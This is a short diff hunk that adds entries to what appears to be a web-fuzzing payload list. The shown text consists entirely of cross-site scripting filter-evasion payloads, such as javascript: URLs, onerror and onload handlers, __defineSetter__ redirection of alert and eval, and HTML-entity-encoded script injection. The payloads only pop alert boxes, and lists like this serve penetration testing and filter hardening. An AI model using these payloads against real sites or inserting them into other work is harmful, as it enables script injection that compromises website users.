@@ -1131,4 +1131,7 @@ XXX<style>*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */<!----><!
 "><a href="JAVASCRIPT:%E2%80%A8alert`1`">CLICKME
 </script%0A-_-><script>confirm(1)</script%0A-_->
 <img src=x:prompt(alt) onerror=eval(src) alt=(1)>
+',__defineSetter__('x',alert),x=1,'
+<iframe name=alert(1) src="//somedomain?x=',__defineSetter__('x',eval),x=name,'"></iframe>
+with(document)body.appendChild(createElement('iframe onload=&#97&#108&#101&#114&#116(1)>')),body.innerHTML+=''
 /* RFI STOP */
